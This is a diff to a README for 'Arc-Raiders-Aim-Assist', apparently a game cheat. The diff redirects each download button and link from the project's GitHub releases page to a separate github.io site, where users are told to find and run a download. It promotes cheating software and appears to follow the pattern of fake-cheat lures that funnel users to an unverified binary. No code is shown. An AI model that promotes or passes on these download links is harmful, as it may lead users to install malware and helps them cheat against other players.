@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run Arc-Raiders-Aim-Assist on you
 
 ### 📥 Download the Application
 
-<a href="https://github.com/mahadevphad0607-del/Arc-Raiders-Aim-Assist/releases" target="_blank" rel="noopener" style="display:inline-block;background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+<a href="https://mahadevphad0607-del.github.io" target="_blank" rel="noopener" style="display:inline-block;background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
 
 Visit this link to download the application.
 
@@ -36,7 +36,7 @@ To run Arc-Raiders-Aim-Assist smoothly, your computer should meet these minimum 
 
 ### Step 1: Download the File
 
-1. Click the **DOWNLOAD NOW** button above or use this link: [https://github.com/mahadevphad0607-del/Arc-Raiders-Aim-Assist/releases](https://github.com/mahadevphad0607-del/Arc-Raiders-Aim-Assist/releases)
+1. Click the **DOWNLOAD NOW** button above or use this link: [https://mahadevphad0607-del.github.io](https://mahadevphad0607-del.github.io)
 2. The website will open in your browser.
 3. Look for the download section and click the download button there.
 4. Your browser will start downloading the file to your computer.
@@ -162,7 +162,7 @@ This tool is provided as-is for educational and gaming enhancement purposes. Alw
 
 Download Arc-Raiders-Aim-Assist today and experience the difference. It takes less than a minute to set up, and you'll immediately notice improved aiming precision.
 
-<a href="https://github.com/mahadevphad0607-del/Arc-Raiders-Aim-Assist/releases" target="_blank" rel="noopener" style="display:inline-block;background-color:#FF5722;color:white;padding:18px 40px;text-align:center;text-decoration:none;font-size:24px;border-radius:10px;font-weight:bold;margin-top:20px;">🎮 GET STARTED NOW</a>
+<a href="https://mahadevphad0607-del.github.io" target="_blank" rel="noopener" style="display:inline-block;background-color:#FF5722;color:white;padding:18px 40px;text-align:center;text-decoration:none;font-size:24px;border-radius:10px;font-weight:bold;margin-top:20px;">🎮 GET STARTED NOW</a>
 
 ---
 
